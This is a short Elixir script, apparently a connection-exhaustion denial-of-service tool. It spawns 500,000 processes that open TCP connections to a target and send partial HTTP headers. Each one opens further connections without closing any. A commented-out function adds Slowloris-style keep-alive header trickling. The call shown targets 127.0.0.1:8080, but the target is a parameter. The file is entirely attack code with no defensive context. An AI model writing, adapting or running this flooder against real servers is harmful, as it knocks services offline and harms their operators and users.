defmodule Volumetric do
  def start(target, port, connection_count) do
    1..connection_count
    |> Enum.each(fn _ ->
      spawn(fn -> hold_connection(target, port) end)
    end)
  end

  defp hold_connection(target, port) do
    case :gen_tcp.connect(String.to_charlist(target), port, [:binary, packet: :raw, active: false]) do
      {:ok, socket} ->
        :gen_tcp.send(socket, "GET / HTTP/1.1\r\n")
        :gen_tcp.send(socket, "Host: #{target}\r\n")

        hold_connection(target, port)
      {:error, _} ->
        :error
    end


  end

  # defp loop_send_headers(socket, interval_ms) do
  #   :timer.sleep(interval_ms)
  #   case :gen_tcp.send(socket, "X-a: keep-alive\r\n") do
  #     :ok -> loop_send_headers(socket, interval_ms)
  #     {:error, _} -> :ok
  #   end
  # end
end

Volumetric.start("127.0.0.1", 8080, 500000)

:timer.sleep(:infinity)
